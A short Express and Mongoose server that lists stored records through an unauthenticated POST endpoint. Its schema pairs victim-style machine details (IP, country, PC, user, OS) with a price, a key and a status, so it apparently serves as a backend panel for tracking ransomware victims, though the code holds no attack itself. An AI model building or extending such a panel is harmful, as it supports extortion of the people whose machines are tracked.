'use strict';
const express = require('express');
const path = require('path');
const app = express();
const mongoose = require("mongoose");
const Schema = mongoose.Schema;

const userScheme = new Schema({

    ID: String,
    IP: String,
    Country: String,
    Flag: String,
    PC: String,
    User: String,
    OS: String,
    TimeZone: String,
    DateTime: String,
    Price: String,
    Key: String,
    Status: String

}, { versionKey: false });

mongoose.connect("mongodb://localhost:27017/usersdb", { useUnifiedTopology: true, useNewUrlParser: true, useFindAndModify: false }, function (err) {

    if (err) {
        return console.log(err)
    }

    app.listen(3000);
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', function (_req, res) {

    res.sendFile(__dirname + "/views/index.html");
});

app.post('/api/users', function (_req, res) {

    const Users = mongoose.model("Users", userScheme);

    Users.find({}, { _id: false }, function (err, docs) {

        if (err) {
            return console.log(err);
        }

        res.send(Array.from(docs).reverse());
    });
});